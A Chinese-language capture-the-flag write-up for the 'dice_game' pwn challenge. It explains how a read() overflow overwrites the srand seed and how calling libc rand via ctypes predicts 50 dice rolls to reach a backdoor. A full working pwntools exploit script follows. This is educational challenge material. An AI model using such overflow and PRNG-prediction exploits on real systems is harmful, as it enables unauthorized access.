### 攻防世界（dice_game）
### 考点：利用溢出修改srand的种子数为1，本地再调用srand（1）去比较绕过，拿到后门。


可以看到函数read存在溢出，并且发现seed[2]的位置是在rbp-0x10的地方，也就是说我们可以覆盖其位置上的数，这也就可以自己任意设置srand的种子数了
![[Pasted image 20240919181504.png]]
下图是需要我们自己输入一个数，需要与rand的结果相同，这样我们才会继续运行
![[Pasted image 20240919181600.png]]
下图是后门，需要我们运行50次后才可以获得
![[Pasted image 20240919181624.png]]

收获：理解了srand与rand的作用，使seed的值为一定值，然后我们在脚本中调用动态库中的srand及rand函数即可。这里又有新的问题了，怎么在脚本中调用动态库中的程序呢，以前是使用plt表＋栈溢出进行调用的，现在利用from ctypes import *库， 使用cdll.LoadLibrary('')代替以前的ELF('')即可，调用动态库的函数。


```
from pwn import *

from LibcSearcher import LibcSearcher

from ctypes import*

import ctypes

def init(file1, file2, x):

    if file2:

        if x:

            return process(file1), ELF(file1), ELF(file2)

        else:

            return remote("node5.buuoj.cn", 26682), ELF(file1), ELF(file2)

    else:

        if x:

            return process(file1), ELF(file1)

        else:

            return remote("node5.buuoj.cn", 26682), ELF(file1)

  

def log(a, b, c):

    if a:

        context.log_level = "debug"

    if b:

        context.os = 'linux'

    if c:

        context.arch = 'amd64'

  

def debug():

    attach(p)

  

r = lambda x: p.recv(x)

ru = lambda str: p.recvuntil(str)

rul1 = lambda: u64(p.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

rul2 = lambda: u64(p.recvuntil('\n')[:-1].ljust(8, b'\x00'))

s = lambda str: p.send(str)

sl = lambda str: p.sendline(str)

sa = lambda a, b: p.sendafter(a, b)

sla = lambda a, b: p.sendlineafter(a, b)

libc_base = lambda addr, name: addr - libc.dump(name)

go = lambda: p.interactive()

  

#######################################################################################

log(1, 1, 1)

p, elf = init("./dice_game", 0, 1)

context.terminal = ['tmux', 'splitw', '-h']

# plt, got, sym = [elf.plt['printf'], elf.got['read'], elf.sym['main']]

# debug()

#######################################################################################

  

libc=cdll.LoadLibrary("./libc.so.6")

payload=b'a'*0x40+p64(1)

ru("Welcome, let me know your name: ")

s(payload)

libc.srand(1)

sleep(1)

for i in range(0,50):

    ru("Give me the point(1~6): ")

    sl(str(libc.rand()%6+1))

  

go()
```